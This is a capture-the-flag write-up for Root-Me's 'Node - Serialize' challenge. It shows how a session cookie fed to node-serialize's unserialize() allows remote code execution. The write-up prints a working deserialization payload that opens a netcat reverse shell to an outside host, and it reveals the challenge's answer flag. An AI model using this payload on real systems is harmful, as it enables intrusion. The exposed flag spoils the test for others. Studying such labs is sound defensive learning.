## Challenge name: Node - Serialize


<img width="1333" height="340" alt="image" src="https://github.com/user-attachments/assets/f2e23d28-089b-4ded-ac64-6e52aa1b9277" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/Node-Serialize](https://www.root-me.org/en/Challenges/Web-Server/Node-Serialize)
<br>
<br>


**After starting the challenge, we are presented with a login page. After we try to login with randrom user%pass it deny us to enter but it sets that input as our session cookie. Quite interesting isn't it?**

<br>
<img width="1333" height="340" alt="image" src="https://github.com/user-attachments/assets/d197c498-4a5f-4029-b91f-374db3677cff" />
<br><br>
<img width="1333" height="340" alt="image" src="https://github.com/user-attachments/assets/fb61112f-17bd-40ed-8455-d54184995fad" />
<br>
<br>

**After we decode the cookie as url it seems like base64 after decoading it as base64 we get json holding the same inputs we entered in login fields. As the challenge name suggests node serialization I suspect the cookie is being sent to unserialize() to prase and node version <= 0.0.4 deserializes functions using eval resulting in RCE. Let's have a look if we hit a snag using the payload:**
<br><br>
```
// Payload eg: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
// In the existing parameters we need to add new parameter and give value what we need to execute so lets craft our final cre proper payload..
// Final RCE Payload Worth To Give A Try:
{"userName":"TheGreen","passWord":"xxx","rce":"_$$ND_FUNC$$_function() {require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc TheGreen-48920.portmap.host 48920 >/tmp/f', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
// encode it: plain_payload -> base64 -> url-encoaded as challenge requires for the cookie..
```

<br>
<img width="1858" height="601" alt="image" src="https://github.com/user-attachments/assets/3065b4cc-30a8-4962-9d2e-9a7a1b007a3b" />
<br><br>
<img width="1626" height="878" alt="image" src="https://github.com/user-attachments/assets/ba9a458f-009c-4932-90bd-aa2e543120f8" />
<br>
<br>

**And after I got some language that I don't understand I changeed it to english using `export LANG=C` and found out that flag was a dir and I was tryin to cat it earlier lol and inside that there was flag in file named secret.**

<br>
<img width="1345" height="466" alt="image" src="https://github.com/user-attachments/assets/ca651746-abce-4a3f-98ee-629e04b43060" />
<br>
<br>

**Key takeaways from this challenge:**
- **Never pass user-controlled data to `unserialize()`**
- **Always keep your node version updated and write safe code.**

<br>

**Challenge validation flag/password:**  
**`Y3pS3r0d3c0mp4nY1sB4d!`**

<br>

**Thank you.**
